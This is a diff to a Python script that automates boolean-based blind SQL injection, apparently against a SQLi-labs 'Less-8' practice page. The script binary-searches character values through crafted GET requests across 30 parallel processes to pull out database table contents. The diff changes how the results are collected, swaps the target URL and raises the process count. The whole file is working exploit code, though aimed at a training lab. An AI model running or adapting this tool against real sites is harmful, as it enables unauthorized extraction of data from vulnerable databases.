@@ -102,7 +102,7 @@ def generate(q) -> None:
         q.put(i)
 
 
-def booler_injection(url, q, q2, v) -> None:
+def booler_injection(url, q, q2, final_list,v) -> None:
     console = Console()
     while True:
         try:
@@ -120,21 +120,19 @@ def booler_injection(url, q, q2, v) -> None:
                 payload_str = py_dict['tables'].format(i, mid)
                 pld = url + payload_str
                 req1 = requests.get(pld)
-                console.print(pld, end='\r')
+                # console.print(pld, end='\r')
                 if req1.text.find('You are in') > 0:
                     low = mid + 1
                 else:
                     high = mid
                 mid = (low + high) // 2
             if mid <= 32 or mid >= 127:
-                q2.put(v.value)
+                q2.put(final_list)
                 break
-            v.value += str(i) + '^' + chr(mid) + '{'
-            # if mid == 44:
-            #     v.value += '\n'
-            # v.value = v.value.replace(',', '')
+            final_list.append(str(i) + '^' + chr(mid))
+            v.value = str(i)
             clear()
-            console.print("[green][+]data is -> [/green]" + v.value + '\n', end='\r')
+            console.print("[green][+]data is -> [/green]" + v.value)
         except Exception as y:
             console.print(y)
             break
@@ -142,30 +140,26 @@ def booler_injection(url, q, q2, v) -> None:
 
 if __name__ == '__main__':
     '''运行前修改URL,payload,判断依据'''
+    final_list = multiprocessing.Manager().list()
     v = multiprocessing.Manager().Value(ctypes.c_char_p, '')  # 创建临界
     console = Console()
     start = time.time()
     q2 = Queue()
     q = Queue()
-    url = "http://79973df3d533493aabe2ed38eb949e9e.app.mituan.zone/Less-8/?id=1'"
+    url = "http://29321b0bf0dd4725a13c87313f06a767.app.mituan.zone/Less-8/?id=1'"
     process_list = []
     generate(q)
-    for i in range(10):
-        p = Process(target=booler_injection, args=(url, q, q2, v))
+    for i in range(30):
+        p = Process(target=booler_injection, args=(url, q, q2, final_list,v))
         p.start()
         process_list.append(p)
     for p in process_list:
         p.join()
-
-    arr2 = q2.get().split("{")
+    arr2 = q2.get()
     arr2 = list(filter(None, arr2))
     quick_sort(arr2, 0, len(arr2) - 1)
     for h in range(len(arr2)):
-        try:
-            str2 = arr2[h]
-            str2 = str2.split("^")[1]
-            arr2[h] = str2
-        except Exception as x:
-            print(x)
-            pass
-    CtrlC(''.join(arr2), start)
+        str2 = arr2[h]
+        str2 = str2.split("^")[1]
+        arr2[h] = str2
+    CtrlC(''.join(arr2).replace(',', '\n'), start)
